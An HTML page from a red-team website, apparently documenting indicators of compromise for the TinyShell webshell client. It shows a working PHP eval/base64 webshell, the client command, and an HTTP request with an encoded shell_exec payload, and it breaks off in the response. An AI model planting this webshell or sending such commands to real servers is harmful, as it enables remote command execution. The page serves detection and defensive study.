@@ -1,0 +1,1416 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="Threatexpress Blog">
+      
+      
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../../../img/favicon.ico">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-3.1.0">
+    
+    
+      
+        <title>TinyShell IOCs - Threatexpress</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/application.11e41852.css">
+      
+        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.22915126.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="">
+      
+    
+    
+      <script src="../../../assets/javascripts/modernizr.20ef595d.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../../assets/fonts/material-icons.css">
+    
+    
+      <link rel="stylesheet" href="../../../css/extra.css">
+    
+      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="black" data-md-color-accent="red">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448"
+    viewBox="0 0 416 448" id="__github">
+  <path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19-18.125
+        8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19 18.125-8.5
+        18.125 8.5 10.75 19 3.125 20.5zM320 304q0 10-3.125 20.5t-10.75
+        19-18.125 8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19
+        18.125-8.5 18.125 8.5 10.75 19 3.125 20.5zM360
+        304q0-30-17.25-51t-46.75-21q-10.25 0-48.75 5.25-17.75 2.75-39.25
+        2.75t-39.25-2.75q-38-5.25-48.75-5.25-29.5 0-46.75 21t-17.25 51q0 22 8
+        38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0
+        37.25-1.75t35-7.375 30.5-15 20.25-25.75 8-38.375zM416 260q0 51.75-15.25
+        82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5-41.75
+        1.125q-19.5 0-35.5-0.75t-36.875-3.125-38.125-7.5-34.25-12.875-30.25-20.25-21.5-28.75q-15.5-30.75-15.5-82.75
+        0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25
+        30.875q36.75-8.75 77.25-8.75 37 0 70 8 26.25-20.5
+        46.75-30.25t47.25-9.75q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34
+        99.5z" />
+</svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#tinyshell-iocs" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="../../.." title="Threatexpress" class="md-header-nav__button md-logo">
+          
+            <img src="../../../img/threatexpress_logo.png" width="24" height="24">
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            
+              <span class="md-header-nav__topic">
+                Threatexpress
+              </span>
+              <span class="md-header-nav__topic">
+                TinyShell IOCs
+              </span>
+            
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          
+            <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+            
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+          
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+
+  <a href="https://github.com/threatexpress/" title="Go to repository" class="md-source" data-md-source="github">
+    
+      <div class="md-source__icon">
+        <svg viewBox="0 0 24 24" width="24" height="24">
+          <use xlink:href="#__github" width="24" height="24"></use>
+        </svg>
+      </div>
+    
+    <div class="md-source__repository">
+      threatexpress/threatexpress
+    </div>
+  </a>
+
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="../../.." title="Threatexpress" class="md-nav__button md-logo">
+      
+        <img src="../../../img/threatexpress_logo.png" width="48" height="48">
+      
+    </a>
+    Threatexpress
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+
+  <a href="https://github.com/threatexpress/" title="Go to repository" class="md-source" data-md-source="github">
+    
+      <div class="md-source__icon">
+        <svg viewBox="0 0 24 24" width="24" height="24">
+          <use xlink:href="#__github" width="24" height="24"></use>
+        </svg>
+      </div>
+    
+    <div class="md-source__repository">
+      threatexpress/threatexpress
+    </div>
+  </a>
+
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../.." title="Home" class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      Blog Posts
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        Blog Posts
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1">
+    
+    <label class="md-nav__link" for="nav-2-1">
+      2019
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-1">
+        2019
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../blogs/2019/penetration-testing-pasties/" title="Penetration Testing Pasties" class="md-nav__link">
+      Penetration Testing Pasties
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2" type="checkbox" id="nav-2-2">
+    
+    <label class="md-nav__link" for="nav-2-2">
+      2018
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-2">
+        2018
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../blogs/2018/a-deep-dive-into-cobalt-strike-malleable-c2/" title="A Deep Dive into Cobalt Strike Malleable C2" class="md-nav__link">
+      A Deep Dive into Cobalt Strike Malleable C2
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/" title="Threat Get's a Vote - Applying a Threat Based Approach to Security Testing" class="md-nav__link">
+      Threat Get's a Vote - Applying a Threat Based Approach to Security Testing
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/" title="Threat Mitagation Strategies - Part 2" class="md-nav__link">
+      Threat Mitagation Strategies - Part 2
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../blogs/2018/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/" title="Automating Cobalt Strike Profiles Apache mod_rewrite htaccess Files for Intelligent C2 Redirection" class="md-nav__link">
+      Automating Cobalt Strike Profiles Apache mod_rewrite htaccess Files for Intelligent C2 Redirection
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../blogs/2018/threat-mitigation-strategies-observations-recommendations/" title="Threat Mitagation Strategies - Part 1" class="md-nav__link">
+      Threat Mitagation Strategies - Part 1
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../blogs/2018/hostenum-updates-usage/" title="HostEnum - Updates and Usage Guide" class="md-nav__link">
+      HostEnum - Updates and Usage Guide
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3">
+    
+    <label class="md-nav__link" for="nav-2-3">
+      2017
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-3">
+        2017
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/" title="Borrowing Microsoft MetaData and Signatures to Hide Binary Payloads" class="md-nav__link">
+      Borrowing Microsoft MetaData and Signatures to Hide Binary Payloads
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../blogs/2017/install-bloodhound-ubuntu/" title="Install BloodHound on Ubuntu" class="md-nav__link">
+      Install BloodHound on Ubuntu
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../blogs/2017/empire-modifying-server-c2-indicators/" title="Empire Modifying Server C2 Indicators" class="md-nav__link">
+      Empire Modifying Server C2 Indicators
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../blogs/2017/invoke-hostenum/" title="Invoke-Hostenum" class="md-nav__link">
+      Invoke-Hostenum
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../blogs/2017/leveraging-expired-domains-for-red-team-engagements/" title="Leveraging Expired Domains for Red Team Engagements" class="md-nav__link">
+      Leveraging Expired Domains for Red Team Engagements
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-4" type="checkbox" id="nav-2-4">
+    
+    <label class="md-nav__link" for="nav-2-4">
+      2016
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-4">
+        2016
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../blogs/2016/slack-notifications-for-cobalt-strike/" title="Slack Notifications for Cobalt Strike" class="md-nav__link">
+      Slack Notifications for Cobalt Strike
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../blogs/2016/web-shells-covert-channel/" title="SubShell and TinyShell - Custom Covert Webshells" class="md-nav__link">
+      SubShell and TinyShell - Custom Covert Webshells
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../blogs/2016/new-information-security-red-teaming-blog-threat-express-minis/" title="New Information Security and Red Teaming Blog Threat Express by MINIS" class="md-nav__link">
+      New Information Security and Red Teaming Blog Threat Express by MINIS
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../redteaming/" title="Red Teaming" class="md-nav__link">
+      Red Teaming
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      Red Team Resources
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        Red Team Resources
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../resources/" title="General" class="md-nav__link">
+      General
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../windowsactivedirectory/" title="Attack Active Directory" class="md-nav__link">
+      Attack Active Directory
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../definitions/" title="Definitions" class="md-nav__link">
+      Definitions
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../rolesandrelationships/" title="Roles and Relationships" class="md-nav__link">
+      Roles and Relationships
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../red_vs_pen_vs_vuln/" title="Red vs Pen vs Vuln" class="md-nav__link">
+      Red vs Pen vs Vuln
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../cheatsheets/" title="Cheatsheets" class="md-nav__link">
+      Cheatsheets
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../mitre_attack/" title="MITRE ATT&CK" class="md-nav__link">
+      MITRE ATT&CK
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
+    
+    <label class="md-nav__link" for="nav-5">
+      Red Team Planning
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        Red Team Planning
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../redteamplanning/goalplanning/" title="Goal Planing" class="md-nav__link">
+      Goal Planing
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../redteamplanning/redteamchecklist/" title="Red Team Checklist" class="md-nav__link">
+      Red Team Checklist
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../redteamplanning/tradecraft/" title="Tradecraft" class="md-nav__link">
+      Tradecraft
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6" checked>
+    
+    <label class="md-nav__link" for="nav-6">
+      Red Team IOCs
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-6">
+        Red Team IOCs
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        TinyShell IOCs
+      </label>
+    
+    <a href="./" title="TinyShell IOCs" class="md-nav__link md-nav__link--active">
+      TinyShell IOCs
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#post-mode" title="Post Mode" class="md-nav__link">
+    Post Mode
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#shell" title="Shell" class="md-nav__link">
+    Shell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#client-command" title="Client Command" class="md-nav__link">
+    Client Command
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-request-sent-by-client" title="HTTP Request Sent by Client" class="md-nav__link">
+    HTTP Request Sent by Client
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-response" title="HTTP Response" class="md-nav__link">
+    HTTP Response
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#decoding-the-payload" title="Decoding the Payload" class="md-nav__link">
+    Decoding the Payload
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#decoding-the-response" title="Decoding the Response" class="md-nav__link">
+    Decoding the Response
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#header-mode" title="Header Mode" class="md-nav__link">
+    Header Mode
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#shell_1" title="Shell" class="md-nav__link">
+    Shell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#client-command_1" title="Client Command" class="md-nav__link">
+    Client Command
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-request-sent-by-client_1" title="HTTP Request Sent by Client" class="md-nav__link">
+    HTTP Request Sent by Client
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-response_1" title="HTTP Response" class="md-nav__link">
+    HTTP Response
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#decoding-the-payload_1" title="Decoding the Payload" class="md-nav__link">
+    Decoding the Payload
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#decoding-the-response_1" title="Decoding the Response" class="md-nav__link">
+    Decoding the Response
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../psexec/" title="PSEXEC IOCs" class="md-nav__link">
+      PSEXEC IOCs
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="https://jpcertcc.github.io/ToolAnalysisResultSheet/" title="JPCert IOCs" class="md-nav__link">
+      JPCert IOCs
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="https://digital-forensics.sans.org/media/SANS_Poster_2018_Hunt_Evil_FINAL.pdf" title="SANS Hunt Evil" class="md-nav__link">
+      SANS Hunt Evil
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../videos/videos/" title="Red Team Videos" class="md-nav__link">
+      Red Team Videos
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../../archive/" title="Archive" class="md-nav__link">
+      Archive
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../../contributors/" title="Contributors" class="md-nav__link">
+      Contributors
+    </a>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#post-mode" title="Post Mode" class="md-nav__link">
+    Post Mode
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#shell" title="Shell" class="md-nav__link">
+    Shell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#client-command" title="Client Command" class="md-nav__link">
+    Client Command
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-request-sent-by-client" title="HTTP Request Sent by Client" class="md-nav__link">
+    HTTP Request Sent by Client
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-response" title="HTTP Response" class="md-nav__link">
+    HTTP Response
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#decoding-the-payload" title="Decoding the Payload" class="md-nav__link">
+    Decoding the Payload
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#decoding-the-response" title="Decoding the Response" class="md-nav__link">
+    Decoding the Response
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#header-mode" title="Header Mode" class="md-nav__link">
+    Header Mode
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#shell_1" title="Shell" class="md-nav__link">
+    Shell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#client-command_1" title="Client Command" class="md-nav__link">
+    Client Command
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-request-sent-by-client_1" title="HTTP Request Sent by Client" class="md-nav__link">
+    HTTP Request Sent by Client
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-response_1" title="HTTP Response" class="md-nav__link">
+    HTTP Response
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#decoding-the-payload_1" title="Decoding the Payload" class="md-nav__link">
+    Decoding the Payload
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#decoding-the-response_1" title="Decoding the Response" class="md-nav__link">
+    Decoding the Response
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/threatexpress/edit/master/docs/redteaming/tool_ioc/tinyshell_ioc.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                <h1 id="tinyshell-iocs">TinyShell IOCs<a class="headerlink" href="#tinyshell-iocs" title="Permanent link">&para;</a></h1>
+<p>TinyShell is a python command shell used to control and excute commands through HTTP requests to a webshell. TinyShell acts as the interface to the remote webshells.
+TinyShell is based on it's companion project SubShell (<a href="https://github.com/minisllc/subshell">https://github.com/minisllc/subshell</a>) and the China Chopper Webshell (<a href="https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html">https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html</a>)</p>
+<p>The following are some of the indicators generated by TinyShell.</p>
+<h2 id="post-mode">Post Mode<a class="headerlink" href="#post-mode" title="Permanent link">&para;</a></h2>
+<p>TinyShell operating in the Base64 HTTP Post Mode using PHP. Commands are sent via a HTTP POST request.</p>
+<h3 id="shell">Shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h3>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]));</span><span class="cp">?&gt;</span>
+</pre></div>
+</td></tr></table>
+
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>The "password" is set to token. This can be changed to any value. It is referenced as "--password=" by the TinyShell client.</p>
+</div>
+<h3 id="client-command">Client Command<a class="headerlink" href="#client-command" title="Permanent link">&para;</a></h3>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>python tinyshell.py --url http://10.203.63.80/upload/uploads/tinyshell.php --password=token --mode=base64_post --language=PHP
+</pre></div>
+</td></tr></table>
+
+<h3 id="http-request-sent-by-client">HTTP Request Sent by Client<a class="headerlink" href="#http-request-sent-by-client" title="Permanent link">&para;</a></h3>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="nf">POST</span> <span class="nn">/upload/uploads/tinyshell.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">10.203.63.80</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">216</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+
+token=ZWNobygiQ1NSRl9UT0tFTjogIiAuIGJhc2U2NF9lbmNvZGUoc2hlbGxfZXhlYyhiYXNlNjRfZGVjb2RlKCdaR2x5SUdNNlhIaGhiWEJ3WEdoMFpHOWpjMXh3YjNKMFlXeGZORGhjZFhCc2IyRmtYSFZ3Ykc5aFpITT0nKSAuICIgMj4mMSIpKSAuICIgOlRPS0VOX0NTUkYiKTs%3D
+</pre></div>
+</td></tr></table>
+
+<h3 id="http-response">HTTP Response<a class="headerlink" href="#http-response" title="Permanent link">&para;</a></h3>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>HTTP/1.1 200 OK
+Date: Wed, 13 Dec 2017 20:45:25 GMT
+Server: Apache/2.4.16 (Win32) OpenSSL/1.0.1p PHP/5.5.28
+X-Powered-By: PHP/5.5.28
+Content-Length: 504
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+
